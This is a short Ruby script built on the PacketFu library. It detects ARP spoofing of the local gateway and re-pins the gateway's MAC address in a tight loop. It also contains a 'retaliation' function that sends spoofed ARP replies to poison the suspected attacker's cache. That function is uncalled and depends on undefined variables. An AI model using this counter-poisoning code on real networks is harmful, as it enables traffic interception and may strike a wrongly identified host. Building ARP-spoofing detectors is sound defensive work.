require 'packetfu'

@default_gateway_ip = '192.168.0.1'
@default_gateway_mac = '30:b5:c2:e0:f7:3a'
@network = PacketFu::Capture.new :iface => 'wlo1', :start => true, :promisc => false, :filter => 'arp'


@packet_queue = Queue.new
Thread.new {
  @network.stream.each do |packet|
    @packet_queue << PacketFu::Packet.parse(packet)
  end
}

def find_attacker(packet)
  puts "this is the attacker mac address " + packet.eth_saddr
  #show more details of the attacker
end

#keep defending the arp cache
def defend(packet)
  Thread.new {
    while true
      system 'arp -d ' + @default_gateway_ip
      system 'arp -s ' + @default_gateway_ip + ' ' + @default_gateway_mac
    end
  }
end

def search_for_poisoner?(packet)
  puts 'do you want to find the attacker ?[Y/n] '
  input = gets.chomp
  if input == 'Y' or input == 'y'
    find_attacker(packet)
  end
end


def get_related_mac
  unless @victim_mac_addr = PacketFu::Utils.arp(@victim_ip_addr, :flavor => 'windows', :iface => @interface, :eth_saddr => @net_info[:eth_saddr] )
    raise "could not resolve the ip related mac address"
  else
    return @victim_mac_addr
  end
end


#run the same attack on the attacker ;)
def retaliation
  # ethernet header
  victim_arp = PacketFu::ARPPacket.new
  victim_arp.eth_daddr = get_related_mac
  victim_arp.eth_saddr = @net_info[:eth_saddr]

  # payload
  victim_arp.arp_opcode = 2   #response   {change it to 1 if you need a request}
  victim_arp.arp_daddr_ip = @victim_ip_addr
  victim_arp.arp_saddr_ip = @default_gateway
  victim_arp.arp_saddr_mac = @net_info[:eth_saddr]
  victim_arp.arp_daddr_mac = @victim_mac_addr

  while true
    sleep 1
    puts "[+] attacking victim at address #{victim_arp.arp_daddr_ip}"
    victim_arp.to_w(@net_info[:iface])
  end
end

while true
  arp_packet = @packet_queue.pop
  if arp_packet.arp_saddr_ip == @default_gateway_ip
    unless arp_packet.eth_saddr == @default_gateway_mac
      puts '[-] a poisoned packet detected'
      puts 'defender is now runing in background'
      defend(arp_packet)
      search_for_poisoner?(arp_packet)
    else
      puts '[+] response packet is safe'
    end
  end
end
